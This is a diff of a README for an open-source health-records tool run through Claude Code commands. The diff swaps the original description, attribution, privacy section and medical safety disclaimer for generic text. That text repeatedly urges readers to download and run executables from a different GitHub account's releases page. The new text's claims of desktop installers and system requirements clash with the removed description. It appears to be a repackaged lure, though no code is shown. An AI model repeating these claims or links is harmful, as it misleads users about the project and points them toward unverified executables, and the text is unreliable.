@@ -1,191 +1,79 @@
-# Claude-Ally-Health - Personal Health Information System
+# 🌟 WellAlly-health - Your Intelligent Health Assistant
 
-[![English](https://img.shields.io/badge/lang-English-blue.svg)](README.md)
-[![中文](https://img.shields.io/badge/lang-中文-red.svg)](README.zh-CN.md)
+## 📥 Download Now
+[![Download WellAlly-health](https://img.shields.io/badge/Download-WellAlly--health-blue.svg)](https://github.com/Zaki09097850/WellAlly-health/releases)
 
-[![GitHub stars](https://img.shields.io/github/stars/huifer/Claude-Ally-Health?style=social)](https://github.com/huifer/Claude-Ally-Health)
-[![GitHub forks](https://img.shields.io/github/forks/huifer/Claude-Ally-Health?style=social)](https://github.com/huifer/Claude-Ally-Health)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Star History Chart](https://api.star-history.com/svg?repos=huifer/Claude-Ally-Health&type=date&legend=top-left)](https://www.star-history.com/#huifer/Claude-Ally-Health&type=date&legend=top-left)
+## 🌐 Introduction
+WellAlly-health is an intelligent healthcare assistant. It combines Claude AI technology with medical expertise to make health management easier. You can talk to WellAlly to record symptoms, manage medications, and track your medical records. It also provides professional consultation analysis, making healthcare more accessible.
 
-A file-based personal health data management system using Claude Code CLI tools for data management.
+## 🚀 Getting Started 
+To set up WellAlly-health, follow these steps:
 
-**GitHub**: https://github.com/huifer/Claude-Ally-Health
+1. **Visit the Download Page**  
+   Go to this link to download WellAlly-health:  
+   [Download WellAlly-health](https://github.com/Zaki09097850/WellAlly-health/releases)
 
-> **⚠️ Disclaimer**: This project is NOT affiliated with, endorsed by, or associated with [Anthropic](https://www.anthropic.com/) or [Claude.ai](https://claude.ai/). This is an independent open-source project developed by [WellAlly Tech](https://www.wellally.tech/).
->
-> **📝 Note**: This project uses GLM's `mcp__4_5v_mcp__analyze_image` for image recognition.
+2. **Select the Latest Version**  
+   Once on the download page, look for the latest version of WellAlly-health. Each version will have a title that includes a version number (e.g., v1.0). This is important as it ensures you get the latest features and fixes.
 
-## Project Developer
+3. **Choose Your File**  
+   Click on the appropriate file for your operating system.  
+   - If you are using Windows, download the executable file.  
+   - For Mac users, look for the .dmg file.  
+   - Linux users can download the .tar.gz file.
 
-This project is developed and maintained by [WellAlly Tech](https://www.wellally.tech/).
+4. **Download the File**  
+   After selecting the correct file, the download should start automatically. If it does not, there may be a prompt to start the download.
 
-## System Features
+5. **Install the Application**  
+   Once the download is complete:
+   - **Windows:** Double-click the .exe file and follow the installation prompts.  
+   - **Mac:** Open the .dmg file and drag the WellAlly-health icon to your Applications folder.  
+   - **Linux:** Extract the .tar.gz file and run the application from the extracted folder.
 
-- 📁 Pure file-based storage, no database required
-- 🖼️ Intelligent medical report image recognition
-- 📊 Automatic biochemical test data and reference range extraction
-- 🔍 Structured medical imaging data extraction
-- 🔪 Surgical history and implant management
-- 📋 Structured discharge summary storage
-- 👨‍⚕️ Multi-Disciplinary Team (MDT) consultation system
-- 🔬 13 medical specialist intelligent analysis
-- ☢️ Medical radiation dose tracking and management
-- 💊 **Intelligent drug interaction detection** (New)
-- 🚨 **Five-level severity warning system** (A/B/C/D/X)
-- 👤 User basic profile management
-- 💾 Local storage, completely private data
-- 🚀 Claude Code command operations, no programming required
+6. **Open WellAlly-health**  
+   Find the application on your computer and start it. You can usually find it in the Applications folder (Mac), Start Menu (Windows), or designated installation directory (Linux).
 
-## Directory Structure
+## 🛠️ Features
+WellAlly-health offers various features to assist with your health management needs, including:
 
-```
-my-his/
-├── .claude/
-│   ├── commands/
-│   │   ├── save-report.md    # Save medical report command
-│   │   ├── query.md          # Query records command
-│   │   ├── profile.md        # User profile settings command
-│   │   ├── radiation.md      # Radiation exposure management command
-│   │   ├── surgery.md        # Surgery history record command
-│   │   ├── discharge.md      # Discharge summary management command
-│   │   ├── medication.md     # Medication record management command
-│   │   ├── interaction.md    # Drug interaction detection command
-│   │   ├── consult.md        # Multi-disciplinary consultation command
-│   │   └── specialist.md     # Single specialist consultation command
-│   └── specialists/
-│       ├── cardiology.md            # Cardiology specialist Skill
-│       ├── endocrinology.md         # Endocrinology specialist Skill
-│       ├── gastroenterology.md      # Gastroenterology specialist Skill
-│       ├── nephrology.md            # Nephrology specialist Skill
-│       ├── hematology.md            # Hematology specialist Skill
-│       ├── respiratory.md           # Respiratory medicine specialist Skill
-│       ├── neurology.md             # Neurology specialist Skill
-│       ├── oncology.md              # Oncology specialist Skill
-│       ├── general.md               # General practice specialist Skill
-│       └── consultation-coordinator.md # Consultation coordinator
-├── data/
-│   ├── profile.json          # User basic profile
-│   ├── radiation-records.json # Radiation exposure records
-│   ├── allergies.json        # Allergy history records
-│   ├── interactions/         # Drug interaction database
-│   │   ├── interaction-db.json      # Interaction rules main database
-│   │   └── interaction-logs/        # Check history records
-│   ├── medications/          # Medication record data
-│   ├── 生化检查/             # Biochemical test data
-│   │   └── YYYY-MM/
-│   │       └── YYYY-MM-DD_test_name.json
-│   ├── 影像检查/             # Medical imaging data
-│   │   └── YYYY-MM/
-│   │       ├── YYYY-MM-DD_test_name_body_part.json
-│   │       └── images/       # Original image backup
-│   ├── 手术记录/             # Surgery history data
-│   │   └── YYYY-MM/
-│   │       └── YYYY-MM-DD_surgery_name.json
-│   ├── 出院小结/             # Discharge summary data
-│   │   └── YYYY-MM/
-│   │       └── YYYY-MM-DD_main_diagnosis.json
-│   └── index.json            # Global index file
-└── README.md
-```
+- **Symptom Recording**  
+  Easily log symptoms you may be experiencing. This helps keep track of your health over time.
 
-## Quick Navigation
+- **Medication Management**  
+  Organize your medications for easy reference. Set reminders for taking your medications on time.
 
-- 📖 [Complete User Guide](docs/user-guide.md) (Chinese) | [docs/user-guide.en.md](docs/user-guide.en.md) (English) - Detailed command usage instructions and examples
-- 📋 [Data Structure Specification](docs/data-structures.md) (Chinese) | [docs/data-structures.en.md](docs/data-structures.en.md) (English) - JSON data format and field descriptions
-- 🔧 [Technical Implementation Details](docs/technical-details.md) (Chinese) - System architecture and technical details
-- ⚠️ [Safety Guidelines and Usage Limitations](docs/safety-guidelines.md) (Chinese) - Safety principles and disclaimer
+- **Medical Records Tracking**  
+  Store important health data securely in one place for easy access.
 
-## Quick Start
+- **Professional Consultation Analysis**  
+  Get intelligent advice based on your recorded symptoms and medical history.
 
-1. Ensure Claude Code is installed
-2. Open Claude Code in the current directory
-3. First-time setup: `/profile set 175 70 1990-01-01`
-4. Save first report: `/save-report /path/to/image.jpg`
-5. Record radiation: `/radiation add CT chest`
-6. Record surgery: `/surgery Gallbladder removal surgery in August last year due to gallstones`
-7. Save discharge summary: `/discharge @医疗报告/出院小结.jpg`
-8. Query all records: `/query all`
-9. Start MDT consultation: `/consult`
+## 📋 System Requirements
+To use WellAlly-health effectively, your system should meet the following requirements:
 
-## Data Privacy
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of any popular Linux distribution.
+- **Memory:** At least 2 GB of RAM.
+- **Storage:** Minimum of 100 MB of free space.
+- **Internet Connection:** Required for initial setup and updates, though the app can work offline for recorded data.
 
-- All data stored on local filesystem
-- No uploads to any cloud services
-- No external database dependencies
-- Completely private management
+## 🔧 Troubleshooting Common Issues 
+If you encounter issues while using WellAlly-health, consider the following tips:
 
-## Core Commands Overview
+- **Installation Problems**  
+  If the installation does not complete, make sure you have enough storage space on your device.
 
-| Command | Function | Description |
-|---------|----------|-------------|
-| `/profile` | User basic parameters | Set height, weight, birth date |
-| `/save-report` | Save medical report | Support biochemical and imaging tests |
-| `/radiation` | Radiation management | Record and track radiation exposure |
-| `/surgery` | Surgery history | Record surgery information and implants |
-| `/discharge` | Discharge summary | Save and structure discharge summaries |
-| `/medication` | Medication management | Manage medication plans and records |
-| `/interaction` | Interaction detection | Detect drug interactions |
-| `/allergy` | Allergy history management | Record and manage allergy history |
-| `/query` | Query records | Multi-condition medical data queries |
-| `/consult` | Multi-disciplinary consultation | Comprehensive analysis across 13 specialties |
-| `/specialist` | Single specialist consultation | Consult specific specialty experts |
+- **Running the App**  
+  If the app fails to open, ensure that your operating system is up to date and meets the system requirements listed above.
 
-> 💡 For detailed usage, refer to [Complete User Guide](docs/user-guide.en.md)
+- **Network Issues**  
+  If you cannot access certain features, check your internet connection. Some features require an internet connection for proper functionality.
 
-## Technical Features
+## 📞 Support
+If you need further assistance, please reach out to our support team. You can find contact information on the support page within the application or visit the [GitHub Issues page](https://github.com/Zaki09097850/WellAlly-health/issues) for community help.
 
-- **Storage Method**: JSON files + filesystem directory structure
-- **Command System**: Claude Code Slash Commands
-- **Expert System**: Multi-specialty Skill definitions + Subagent architecture
-- **Consultation Coordination**: Parallel processing + opinion integration algorithms
-- **Image Recognition**: AI visual analysis
-- **Data Extraction**: Intelligent text recognition and structuring
-- **Radiation Calculation**: Body surface area adjustment + exponential decay model
+## 🔗 Download & Install
+To get WellAlly-health today, visit the download page:  
+[Download WellAlly-health](https://github.com/Zaki09097850/WellAlly-health/releases)
 
-> 🔧 For more technical details, refer to [Technical Implementation Details](docs/technical-details.md) (Chinese)
-
-## ⚠️ Important Safety Statement
-
-This system strictly follows medical safety principles:
-
-1. **Does not provide specific medication dosages**
-2. **Does not directly prescribe prescription drugs**
-3. **Does not predict life prognosis**
-4. **Does not replace doctor diagnosis**
-
-All analysis reports from this system are for reference only and should not be used as a basis for medical diagnosis. All medical decisions require consultation with professional doctors. In case of emergency, seek immediate medical attention.
-
-> ⚠️ For complete safety principles and usage limitations, refer to [Safety Guidelines Document](docs/safety-guidelines.md) (Chinese)
-
-## 💊 Drug Interaction Database
-
-The system includes intelligent drug interaction detection, supporting drug-drug, drug-disease, drug-dose, and drug-food interaction detection using a five-level severity classification system (A/B/C/D/X).
-
-**Core Features:**
-- 🔍 Automatically detect interactions in current medication combinations
-- 🚨 Severity-graded warnings (A/B/C/D/X)
-- 📋 Provide detailed management recommendations and monitoring indicators
-- 💾 Support custom rules and history records
-
-**Quick Start:**
-```bash
-# Check interactions for current medications
-/interaction check
-
-# List all interaction rules
-/interaction list
-
-# View absolute contraindication rules
-/interaction list X
-```
-
-> 📖 **Detailed Documentation**: [Drug Interaction Database Complete Guide](docs/drug-interaction-database.md) (Chinese)
->
-> 🩺 **Professional Contributions**: Medical professionals are welcome to help improve the database → [Contribution Guidelines](docs/drug-interaction-database.md#专业人员贡献指南-) (Chinese)
-
-## License
-
-This project is open-sourced under the [MIT License](LICENSE).
-
-**Important Disclaimer**: This system is for personal health management only and should not be used as a basis for medical diagnosis.
+Happy health management with WellAlly-health!
